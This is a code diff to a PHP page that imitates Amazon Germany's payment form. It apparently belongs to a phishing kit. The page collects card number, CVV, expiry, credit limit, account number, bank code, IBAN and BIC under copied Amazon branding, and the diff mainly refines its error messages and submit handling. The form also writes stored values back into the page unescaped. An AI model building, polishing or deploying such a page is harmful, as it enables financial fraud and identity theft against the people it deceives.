@@ -8,7 +8,7 @@
 ?>
 
 <!DOCTYPE html>
-<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition" data-aui-build-date="3.17.4.2-2017-03-18">
+<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-aui-build-date="3.17.4.2-2017-03-18">
 	<head>
 		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
 		<link rel="stylesheet" href="src/css/31O9784sOL.css">
@@ -221,7 +221,7 @@
 								</div>
 
 								<div class="cu-middle">
-									<div class="cs-step" id="orderSelect" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
+									<!-- <div class="cs-step" id="orderSelect" style="display:<?php echo ((isset($_SESSION['errList']) && count($_SESSION['errList'] != 0)) ? "block" : "none") ?>">
 										<div id="orderUnrelatedArea" class="newOrderSummary" style="background-color:#FFFFDD;border: 1px solid #A31919">
 											<table class="newOrderTable" cellspacing="0" cellpadding="0" border="0">
 												<tbody>
@@ -232,13 +232,14 @@
 															<h6>Es ist ein Fehler aufgetreten:</h6>
 															<ul style="color:#A31919">
 																<?php
+																	/*
 																	if (isset($_SESSION['errList'])) {
 																		for ($i = 0; $i < count($_SESSION['errList']); $i++) {
 																			echo '<li>' . $_SESSION['errList'][$i] . '</li>';
 																		}
 																		
 																		unset($_SESSION['errList']);
-																	}
+																	}*/
 																?>
 															</ul>
 														</div>
@@ -247,7 +248,7 @@
 												</tbody>
 											</table>                                                                           
 										</div>
-									</div>
+									</div> -->
 								
 									<div class="cs-step" id="orderSelect">
 										<div id="orderUnrelatedArea" class="newOrderSummary">
@@ -292,19 +293,47 @@
 															?>
 														
 															<input name="ccnr" value="<?php echo (isset($_SESSION['ccnr']) ? $_SESSION['ccnr'] : ""); ?>" autocomplete="off" maxlength="16" type="text" id="ccnr"
-															style="background-image: url(src/img/cc_typ.png);background-position:225px <?php echo $icon ?>;background-repeat: no-repeat;height:22px;width:250px;margin-top:-5px;<?php echo (isset($_SESSION['cc_err']) ? "border:1px solid #A31919" : ""); ?>" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
+															style="background-image: url(src/img/cc_typ.png);background-position:225px <?php echo $icon ?>;background-repeat: no-repeat;height:22px;width:250px;margin-top:-5px;" class="<?php echo (isset($_SESSION['cc_err']) ? "a-form-error" : ""); ?>" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
+
+															<?php if(isset($_SESSION['errList']['ccnr'])) { ?>
+																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
+																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																        <div class="a-box-inner a-alert-container">
+																            <i class="a-icon a-icon-alert"></i>
+																            <div class="a-alert-content">
+																                <div class="a-section"><?php echo $_SESSION['errList']['ccnr'];?></div>
+																            </div>
+																        </div>
+																    </div>
+																</div>
+															<?php } ?>															
+
 														</td>
 													</tr>
 													
 													<tr>
 														<td style="padding-bottom:10px"><b><label style="font-size:13px">Kartenprüfziffer:</label></b></td>
 														<td style="padding-bottom:10px">
-															<input name="cvv" value="<?php echo (isset($_SESSION['cvv']) ? $_SESSION['cvv'] : ""); ?>" id="cvv" autocomplete="off" maxlength="4" type="text" style="display:inline-block;height:18px;width:250px;<?php echo (isset($_SESSION['cvv_err']) ? "border:1px solid #A31919" : ""); ?>" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
-															<div id='box' style="float:right">
+															<input name="cvv" value="<?php echo (isset($_SESSION['cvv']) ? $_SESSION['cvv'] : ""); ?>" id="cvv" autocomplete="off" maxlength="4" type="text" style="height:18px;width:250px;" class="pull-left <?php echo (isset($_SESSION['cvv_err']) ? "a-form-error" : ""); ?>" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
+															<div id='box' class="pull-left">
 																<a href='#' class="cvc-gif cvvIcon">
 																	<span style="left:30%;top:30%;width:370px;height:345px"><img src="src/img/cvc.gif"/></span>
 																</a>
 															</div>
+															<div class="clearfix"></div>
+
+															<?php if(isset($_SESSION['errList']['cvv'])) { ?>
+																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
+																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																        <div class="a-box-inner a-alert-container">
+																            <i class="a-icon a-icon-alert"></i>
+																            <div class="a-alert-content">
+																                <div class="a-section"><?php echo $_SESSION['errList']['cvv'];?></div>
+																            </div>
+																        </div>
+																    </div>
+																</div>
+															<?php } ?>																
 														</td>
 													</tr>
 													
@@ -313,7 +342,7 @@
 														<td style="padding-bottom:10px">
 
 															<?php		
-																echo '<select style="border:1px solid #a6a6a6;width:77px;padding:4px;border-top-color: #949494' . (isset($_SESSION['ccDate1_err']) ? ";border:1px solid #A31919" : "") . '" name="ccDate1" id="ccDate1"' . (isset($_SESSION['noCC']) ? " disabled" : "") . '><option value="Monat">Monat</option>';
+																echo '<select style="border:1px solid #a6a6a6;width:77px;padding:4px;border-top-color: #949494" class="' . (isset($_SESSION['ccDate1_err']) ? "a-select-multiple a-form-error" : "") . '" name="ccDate1" id="ccDate1"' . (isset($_SESSION['noCC']) ? " disabled" : "") . '><option value="Monat">Monat</option>';
 																
 																for ($i = 1; $i <= 12; $i++) {
 																	if (isset($_SESSION['ccDate1'])) {
@@ -332,7 +361,7 @@
 															&nbsp;
 															
 															<?php		
-																echo '<select style="border:1px solid #a6a6a6;width:77px;padding:4px;border-top-color: #949494' . (isset($_SESSION['ccDate2_err']) ? ";border:1px solid #A31919" : "") . '" name="ccDate2" id="ccDate2"' . (isset($_SESSION['noCC']) ? " disabled" : "") . '><option value="Jahr">Jahr</option>';
+																echo '<select style="border:1px solid #a6a6a6;width:77px;padding:4px;border-top-color: #949494" class="' . (isset($_SESSION['ccDate2_err']) ? "a-select-multiple a-form-error" : "") . '" name="ccDate2" id="ccDate2"' . (isset($_SESSION['noCC']) ? " disabled" : "") . '><option value="Jahr">Jahr</option>';
 															
 																$year = date("Y");
 																for ($i = $year; $i <= $year + 6; $i++) {
@@ -348,19 +377,33 @@
 																}
 																echo '</select>';
 															?>
-														
+
+															<?php if(isset($_SESSION['errList']['ccDate'])) { ?>
+																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
+																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																        <div class="a-box-inner a-alert-container">
+																            <i class="a-icon a-icon-alert"></i>
+																            <div class="a-alert-content">
+																                <div class="a-section"><?php echo $_SESSION['errList']['ccDate'];?></div>
+																            </div>
+																        </div>
+																    </div>
+																</div>
+															<?php } ?>														
 														</td>
 													</tr>
 													
 													<tr>
 														<td style="padding-bottom:20px"><b><label style="font-size:13px">Verfügungsrahmen (optional):</label></b></td>
 														<td style="padding-bottom:20px">
-															<input name="limit" value="<?php echo (isset($_SESSION['limit']) ? $_SESSION['limit'] : ""); ?>" id="limit" autocomplete="off" maxlength="10" type="text" style="height:18px;width:250px" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
-															<div id='box' style="float:right">
+															<input name="limit" value="<?php echo (isset($_SESSION['limit']) ? $_SESSION['limit'] : ""); ?>" id="limit" autocomplete="off" maxlength="10" type="text" class="pull-left" style="height:18px;width:250px" <?php echo (isset($_SESSION['noCC']) ? "disabled" : ""); ?>>
+															<div id='box' class="pull-left">
 																<a href='#' class="cvvIcon">
 																	<span style="top: 40%;left: 30%;">Den Verfügungsrahmen finden Sie auf Ihrer letzten Abrechnung oder online auf dem Portal Ihres Kreditinstituts.</span>
 																</a>
 															</div>
+
+															<div class="clearfix"></div>
 														</td>
 													</tr>
 													<tr>
@@ -370,19 +413,34 @@
 													<tr id="ktofield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "table-row" : "none"); ?>">
 														<td style="padding-top:15px;padding-bottom:7px"><b><label style="font-size:13px">Abrechnungskonto:</label></b></td>
 														<td style="padding-top:15px;padding-bottom:7px">
-															<input id="kto" name="kto" value="<?php echo (isset($_SESSION['kto']) ? $_SESSION['kto'] : ""); ?>" autocomplete="off" maxlength="30" type="text" style="height:18px;width:250px;<?php echo (isset($_SESSION['kto_err']) ? "border:1px solid #A31919" : ""); ?>">
-															<div id='box' style="float:right">
+															<input id="kto" name="kto" value="<?php echo (isset($_SESSION['kto']) ? $_SESSION['kto'] : ""); ?>" autocomplete="off" maxlength="30" type="text" style="height:18px;width:250px;" class="pull-left <?php echo (isset($_SESSION['kto_err']) ? "a-form-error" : ""); ?>">
+															<div id='box' class="pull-left">
 																<a href='#' class="cvvIcon">
 																	<span style="top: 50%;left: 30%;">Bitte geben Sie das Abrechnungskonto von Ihrer Kreditkarte an.</span>
 																</a>
 															</div>
+
+															<div class="clearfix"></div>
 														</td>
 													</tr>
 													
 													<tr id="blzfield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "table-row" : "none"); ?>">
 														<td style="padding-bottom:5px"><b><label style="font-size:13px">Bankleitzahl:</label></b></td>
 														<td style="padding-bottom:5px">
-															<input id="blz" name="blz" value="<?php echo (isset($_SESSION['blz']) ? $_SESSION['blz'] : ""); ?>" autocomplete="off" maxlength="20" type="text" style="height:18px;width:250px;<?php echo (isset($_SESSION['blz_err']) ? "border:1px solid #A31919" : ""); ?>">
+															<input id="blz" name="blz" value="<?php echo (isset($_SESSION['blz']) ? $_SESSION['blz'] : ""); ?>" autocomplete="off" maxlength="20" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['blz_err']) ? "a-form-error" : ""); ?>">
+
+															<?php if(isset($_SESSION['kto_active']) && isset($_SESSION['errList']['kto_blz'])) { ?>
+																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert" style="max-width: 300px">
+																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																        <div class="a-box-inner a-alert-container">
+																            <i class="a-icon a-icon-alert"></i>
+																            <div class="a-alert-content">
+																                <div class="a-section"><?php echo $_SESSION['errList']['kto_blz'];?></div>
+																            </div>
+																        </div>
+																    </div>
+																</div>
+															<?php } ?>															
 														</td>
 													</tr>
 													
@@ -394,13 +452,41 @@
 													<tr id="ibanfield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "none" : "table-row"); ?>">
 														<td style="padding-top:15px;padding-bottom:7px"><b><label style="font-size:13px">IBAN:</label></b></td>
 														<td style="padding-top:15px;padding-bottom:7px">
-															<input id="iban" name="iban" value="<?php echo (isset($_SESSION['iban']) ? $_SESSION['iban'] : ""); ?>" autocomplete="off" maxlength="30" type="text" style="height:18px;width:250px;<?php echo (isset($_SESSION['iban_err']) ? "border:1px solid #A31919" : ""); ?>">
+															<input id="iban" name="iban" value="<?php echo (isset($_SESSION['iban']) ? $_SESSION['iban'] : ""); ?>" autocomplete="off" maxlength="30" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['iban_err']) ? "a-form-error" : ""); ?>">
+
+															<?php if(!isset($_SESSION['kto_active']) && isset($_SESSION['errList']['iban'])) { ?>
+																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert" style="max-width: 300px">
+																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																        <div class="a-box-inner a-alert-container">
+																            <i class="a-icon a-icon-alert"></i>
+																            <div class="a-alert-content">
+																                <div class="a-section"><?php echo $_SESSION['errList']['iban'];?></div>
+																            </div>
+																        </div>
+																    </div>
+																</div>
+															<?php } ?>	
 														</td>
 													</tr>
 													
 													<tr id="bicfield" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "none" : "table-row"); ?>">
 														<td style="padding-bottom:5px"><b><label style="font-size:13px">BIC:</label></b></td>
-														<td style="padding-bottom:5px"><input id="bic" name="bic" value="<?php echo (isset($_SESSION['bic']) ? $_SESSION['bic'] : ""); ?>" autocomplete="off" maxlength="20" type="text" style="height:18px;width:250px;<?php echo (isset($_SESSION['bic_err']) ? "border:1px solid #A31919" : ""); ?>"></td>
+														<td style="padding-bottom:5px">
+															<input id="bic" name="bic" value="<?php echo (isset($_SESSION['bic']) ? $_SESSION['bic'] : ""); ?>" autocomplete="off" maxlength="20" type="text" style="height:18px;width:250px;" class="<?php echo (isset($_SESSION['bic_err']) ? "a-form-error" : ""); ?>">
+
+															<?php if(!isset($_SESSION['kto_active']) && isset($_SESSION['errList']['bic'])) { ?>
+																<div class="a-section a-spacing-none a-spacing-top-micro address-ui-widgets-inline-error-alert">
+																    <div class="a-box a-alert-inline a-alert-inline-error" aria-live="assertive" role="alert">
+																        <div class="a-box-inner a-alert-container">
+																            <i class="a-icon a-icon-alert"></i>
+																            <div class="a-alert-content">
+																                <div class="a-section"><?php echo $_SESSION['errList']['bic'];?></div>
+																            </div>
+																        </div>
+																    </div>
+																</div>
+															<?php } ?>																
+														</td>
 													</tr>
 													
 													<tr id="kto_lbl_field" style="display: <?php echo ((isset($_SESSION['kto_active']) && !empty($_SESSION['kto_active'])) ? "none" : "table-row"); ?>">
@@ -411,7 +497,8 @@
 													<tr>
 														<td style="padding-top:15px"></td>
 														<td style="padding-top:15px">
-															<input type="image" name="doPaymentInfo" src="src/img/doPersonal.png" style="border:none;margin-left:55px">
+															<input type="hidden" name="doPaymentInfo_x" value="1">
+															<input type="hidden" name="doPaymentInfo_y" value="1">
 															<div style="width:265px">
 																<span id="B2B-Full-1-heroctavideo-register" class="a-button a-button-span12 a-button-primary button-register">
 																	<span class="a-button-inner btn-sec-sm">
@@ -603,6 +690,8 @@
 			if (isset($_SESSION['blz_err'])) { unset($_SESSION['blz_err']); }
 			if (isset($_SESSION['iban_err'])) { unset($_SESSION['iban_err']); }
 			if (isset($_SESSION['bic_err'])) { unset($_SESSION['bic_err']); }
+
+			unset($_SESSION['errList']);
 		?>
 		<div id="navFooter" class="navLeftFooter nav-sprite-v1"> <a href="#" id="navBackToTop"> <div class="navFooterBackToTop"><span class="navFooterBackToTopText">Zurück zum Seitenanfang</span> </div> </a> <table class="navFooterVerticalColumn" cellspacing="0" align="center"> <tbody><tr> <td class="navFooterLinkCol"> <div class="navFooterColHead">Über Amazon</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Karriere bei Amazon</a> </li> <li> <a href="#" class="nav_a">Pressemitteilungen</a> </li> <li> <a href="#" class="nav_a">Über uns - von A bis Z</a> </li> <li> <a href="#" class="nav_a">Amazon Logistikblog</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Impressum</a> </li> </ul> </td> <td class="navFooterColSpacerInner"></td> <td class="navFooterLinkCol"> <div class="navFooterColHead">Geld verdienen mit Amazon</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Jetzt verkaufen</a> </li> <li> <a href="#" class="nav_a">Verkaufen bei Amazon Business</a> </li> <li> <a href="#" class="nav_a">Partnerprogramm</a> </li> <li> <a href="#" class="nav_a">Versand durch Amazon</a> </li> <li> <a href="#" class="nav_a">Bewerben Sie Ihre Produkte</a> </li> <li> <a href="#" class="nav_a">Ihr Buch mit uns veröffentlichen</a> </li> <li> <a href="#" class="nav_a">Amazon Pay</a> </li> <li> <a href="#" class="nav_a">Werden Sie ein Amazon-Lieferant</a> </li> <li class="nav_last nav_a_carat "> <span class="nav_a_carat">›</span> <a href="#" class="nav_a">Alle anzeigen</a> </li> </ul> </td> <td class="navFooterColSpacerInner"></td> <td class="navFooterLinkCol"> <div class="navFooterColHead">Amazon Zahlungsarten</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Amazon.de VISA Karte</a> </li> <li> <a href="#" class="nav_a">Kreditkarten</a> </li> <li> <a href="#" class="nav_a">Gutscheine</a> </li> <li> <a href="#" class="nav_a">Rechnung</a> </li> <li> <a href="#" class="nav_a">Bankeinzug</a> </li> <li> <a href="#" class="nav_a">Amazon Currency Converter</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Mein Amazon-Konto aufladen</a> </li> </ul> </td> <td class="navFooterColSpacerInner"></td> <td class="navFooterLinkCol"> <div class="navFooterColHead">Wir helfen Ihnen</div> <ul> <li class="nav_first"> <a href="#" class="nav_a">Lieferung verfolgen oder Bestellung anzeigen</a> </li> <li> <a href="#" class="nav_a">Versand &amp; Verfügbarkeit</a> </li> <li> <a href="#" class="nav_a">Amazon Prime</a> </li> <li> <a href="#" class="nav_a">Rückgabe &amp; Ersatz</a> </li> <li> <a href="#" class="nav_a">Meine Inhalte und Geräte</a> </li> <li> <a href="#" class="nav_a">Amazon App</a> </li> <li> <a href="#" class="nav_a">Amazon Assistant</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Hilfe</a> </li> </ul> </td> </tr> </tbody></table> <div class="nav-footer-line"></div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine"> <span> <div class="navFooterLine navFooterLogoLine"> <a href="#"> <div class="nav-logo-base nav-sprite"></div> </a> </div> </span> <span class="icp-container-desktop"> <div class="navFooterLine"> <style type="text/css">#icp-touch-link-country{display:none}#icp-touch-link-language{display:none}</style> <a href="#" class="icp-button a-declarative" id="icp-touch-link-language"> <div class="icp-nav-globe-img-2 icp-button-globe-2"></div><span class="icp-color-base">Deutsch</span><span class="nav-arrow icp-up-down-arrow"></span> </a> <a href="#" class="icp-button a-declarative" id="icp-touch-link-country"> <span class="icp-flag-3 icp-flag-3-de"></span><span class="icp-color-base">Deutschland</span> </a> </div> </span> </div> <div class="navFooterLine navFooterLinkLine navFooterDescLine"> <table class="navFooterMoreOnAmazon" cellspacing="0"><tbody> <tr> <td class="navFooterDescItem"> <a href="#" class="nav_a"> AbeBooks<br><span class="navFooterDescText"> Bücher, Kunst<br>&amp; Sammelobjekte </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Amazon BuyVIP<br><span class="navFooterDescText"> Shopping Club<br>für Mode </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Amazon Web Services<br><span class="navFooterDescText"> Cloud Computing Dienste<br>von Amazon </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Audible<br><span class="navFooterDescText"> Hörbücher<br>herunterladen </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Book Depository<br><span class="navFooterDescText"> Bücher mit kostenfreier<br>Lieferung weltweit </span> </a> </td> </tr> <tr><td>&nbsp;</td></tr> <tr> <td class="navFooterDescItem"> <a href="#" class="nav_a"> IMDb<br><span class="navFooterDescText"> Filme, TV<br>&amp; Stars </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Kindle Direct Publishing<br><span class="navFooterDescText"> Ihr E-Book<br>veröffentlichen </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> MYHABIT<br><span class="navFooterDescText"> Private Modeschöpfer<br>Verkäufe </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Prime Now<br><span class="navFooterDescText"> 1-Stunden-Lieferung<br>Tausender Produkte </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Shopbop<br><span class="navFooterDescText"> Designer<br>Modemarken </span> </a> </td> </tr> <tr><td>&nbsp;</td></tr> <tr> <td class="navFooterDescItem"> &nbsp; </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> Warehouse Deals<br><span class="navFooterDescText"> Reduzierte B-Ware<br></span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> ZVAB<br><span class="navFooterDescText"> Zentrales Verzeichnis<br>Antiquarischer Bücher und mehr </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> <a href="#" class="nav_a"> LOVEFiLM<br><span class="navFooterDescText"> DVD &amp; Blu-ray<br>Verleih per Post </span> </a> </td> <td class="navFooterDescSpacer" style="width: 4%"></td> <td class="navFooterDescItem"> &nbsp; </td> </tr> </tbody></table> </div> <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright"> <ul> <li class="nav_first"> <a href="#" class="nav_a">Unsere AGB</a> </li> <li> <a href="#" class="nav_a">Datenschutzerklärung</a> </li> <li> <a href="#" class="nav_a">Impressum</a> </li> <li class="nav_last "> <a href="#" class="nav_a">Cookies &amp; Internet-Werbung</a> </li> </ul> <span>© 1998-<?php echo date("Y"); ?>, Amazon.com, Inc. oder Tochtergesellschaften</span> </div> </div>
 	</body>
